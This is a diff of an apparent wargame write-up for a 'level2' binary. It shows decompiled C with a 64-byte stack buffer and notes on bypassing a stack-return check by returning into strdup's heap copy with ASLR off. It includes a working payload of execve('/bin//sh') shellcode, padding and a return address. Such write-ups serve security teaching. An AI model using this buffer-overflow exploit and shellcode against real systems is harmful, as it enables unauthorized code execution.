@@ -1,3 +1,6 @@
+# Solution
+
+```c
 int p()
 {
   char v1[64]; // [esp+1Ch] [ebp-4Ch] BYREF
@@ -14,16 +17,20 @@ int p()
   }
   puts(v1);
   return strdup(v1);
+}
+```
 
   exploit : make the return adresse point to a shellcode
-  but "if ( (retaddr & 0xB0000000) == -1342177280 )" block us from writting the shellcode
+  but "if ( (retaddr & 0xB0000000) == -1342177280 )" block us from returning to the shellcode
   in the stack so we will use the heap instead
 
   since aslr is disabled strdup will have the same return adress
   (check $eax in gdb or ltrace)
 
 payload :
+  ```sh
   (python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + 'A'*52 + '\x08\xa0\x04\x08'";cat -) | ./level2
+  ```
   shellcode > padding > return adress
 
 
